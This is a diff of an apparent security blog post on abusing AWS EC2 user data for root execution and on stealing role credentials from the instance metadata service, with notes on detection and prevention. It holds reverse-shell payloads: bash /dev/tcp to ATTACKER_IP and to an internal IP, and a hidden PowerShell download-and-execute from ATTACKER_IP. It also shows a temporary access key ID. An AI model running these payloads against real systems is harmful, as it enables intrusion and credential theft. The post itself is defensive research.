@@ -157,7 +157,22 @@
           <p>Typically, SSH keys or AWS Systems Manager (SSM) are used to administer EC2 instances. However, if those are disabled or inaccessible, an attacker who can supply or modify user data can still execute commands as root during instance startup.</p>
 
           <p>From there, the attacker can query the Instance Metadata Service (IMDS) at the link-local address 169.254.169.254 to retrieve temporary AWS credentials for the role attached to the instance via its instance profile. These credentials are issued on demand by AWS STS (Security Token Service) and are accessible to any process running on the instance.</p>
+
           
+          <h2 class="section-heading">Example Payloads</h2>
+
+          <p>Here are simple demonstration payloads showing how an attacker could leverage User Data for a shell:</p>
+
+          <p><u>Linux (Netcat Reverse Shell Example)</u>:</p>
+          <code>#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code>
+
+          <p><u>Windows (PowerShell Reverse Shell Example)</u>:</p>
+          <code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command 
+"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"</code>
+
+          <p>Both payloads are executed with full administrative privileges on first boot through user data.</p>
+
 
           <h2 class="section-heading">Demo Time</h2>
 
@@ -294,19 +309,6 @@ bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
             <li>I could not find the Access Key: ASIAZ5UWVVHTJEKBDCJ3 in any other generic CloudTrail logs</li>
             <li>The EC2 User Data being set can be seen in the <inline-code>eventName: "ModifyInstanceAttribute"</inline-code> log by filtering for <inline-code>requestParameters.userData=*</inline-code>. The actual content of the User Data is redacted though, so can't be inspected for malicious content</li>
 
-          <h2 class="section-heading">Example Payloads</h2>
-
-          <p>Here are simple demonstration payloads showing how an attacker could leverage User Data for a shell:</p>
-
-          <p><u>Linux (Netcat Reverse Shell Example)</u>:</p>
-          <code>#!/bin/bash
-bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code>
-
-          <p><u>Windows (PowerShell Reverse Shell Example)</u>:</p>
-          <code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command 
-"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"</code>
-
-          <p>Both payloads are executed with full administrative privileges on first boot through user data.</p>
 
           <h2 class="section-heading">Preventing Abuse of EC2 User Data</h2>
 
